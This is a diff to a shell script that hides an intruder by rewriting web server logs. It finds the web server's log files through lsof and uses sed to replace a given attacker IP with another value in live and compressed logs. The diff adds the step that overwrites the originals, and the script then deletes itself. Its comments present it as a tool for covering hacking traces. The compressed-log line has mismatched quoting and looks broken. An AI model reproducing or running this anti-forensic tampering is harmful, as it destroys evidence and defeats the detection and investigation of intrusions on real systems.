@@ -6,7 +6,6 @@
 ip=$1
 replace=$2
 os=$OSTYPE
-# you can add all paths for all os type !M$ windows IS NOT OS ....Exactly!
 case $os in
 Linux*) number="\$9"
 	zip_type=gz
@@ -21,14 +20,9 @@ FreeBSD*) number="\$8,\"/\",\$10"
 ;;
 esac
 echo "Searching for attacker IP: $ip target machine: $os "
-# find which one of httpd server is running .... 
-web_srv="`lsof 2>/dev/null -iTCP -sTCP:LISTEN -PN |grep  '*:80\|*:443' 2> /dev/null |awk {' print $1 '}|uniq`" 
-### change it if listen ports is not default 
-#.logs
+web_srv="`lsof 2>/dev/null -iTCP -sTCP:LISTEN -PN |grep  '*:80\|*:443' 2> /dev/null |awk {' print $1 '}|uniq`" ### if listening port is default everything will be ok, else change it you hacked it not me .
 for line in "`lsof 2>/dev/null| grep $web_srv | grep log  | awk {' print '$number' '} | sort | uniq | sed 's/ //g'`";do 
-[ "`grep -m 1  $ip $line`" ]&& sed 's/'$ip'/'$replace'/g' $line >/tmp/$(basename $line) ### change it for log name ! 
+[ "`grep -m 1  $ip $line`" ]&& sed 's/'$ip'/'$replace'/g' $line >/tmp/$(basename $line) && mv /tmp/$(basename $line)  $line
 [ -f "$line.*.$zip_type" ]&& echo "old compressed logs found ! " && for zp in  $(ls $line.*.$zip_type) ;do 	
-gzip -cdk $zp | sed 's/'$ip'/'$replace'/g' | gzip >/tmp/$(basename $zp)" ;echo " mv /tmp/$(basename $zp) $line.$(basename $zp) ;done || echo "no such compressed log were found " 
-### needz to more time for correcting file name and path.
-done
+gzip -cdk $zp | sed 's/'$ip'/'$replace'/g' | gzip >/tmp/$(basename $zp)" ;echo " mv /tmp/$(basename $zp) $line.$(basename $zp) ;done || echo "no such compressed log were found ";done
 rm $0
